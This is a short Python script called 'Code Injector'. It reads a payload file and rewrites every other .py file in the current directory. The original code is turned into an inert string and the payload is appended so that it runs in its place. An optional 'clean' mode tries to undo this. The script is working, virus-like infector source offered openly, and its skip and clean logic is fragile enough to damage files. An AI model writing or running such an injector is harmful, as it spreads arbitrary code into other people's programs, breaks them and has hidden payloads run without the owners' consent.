#!/usr/bin/env python
'''
Program: Code Injector
Programmer: Miles Boswell
This program injects code from another file into all other .py files in the
current directory with that payload code. A payload could also be retrieved 
from this file, but doing so would execute that code when executing this file.
'''
import glob, sys

# read contents of payload.py
with open('./payload.py', 'r') as file:
	payload = file.read()

def inject(file, payload=payload):
	# read file contents
	with open(file, 'r') as f:
		original = f.readlines()
	with open(file, 'w') as f:
		# comment out everything in original program
		f.write('"""\n')
		for line in original:
			f.write(line)
		f.write('\n"""\n')
		# write in payload code
		f.write(payload)
def clean(file):
	with open(file, 'r') as f:
		original = f.readlines()
		# delete payload code
		original.remove('"""\n')
		end = original.index('"""\n')
		for injected in original[end:]:
			original.remove(injected)
		# remove \n at the end of last line
		original[-1] = original[-1][:-1]
	with open(file, 'w') as f:
		# write original lines to file
		for line in original:
			f.write(line)

if __name__ == '__main__':
	files = glob.glob('./*.py')[1:]
	files.remove('./payload.py')
	try:
		cmd = sys.argv[1]
	except IndexError:
		cmd = False
	if cmd == 'clean':
		for file in files:
			clean(file)
			print('Cleaned file: %s' % file)
	else:
		for file in files:
			inject(file, payload=payload)
			print('Injected payload in file: %s' % file)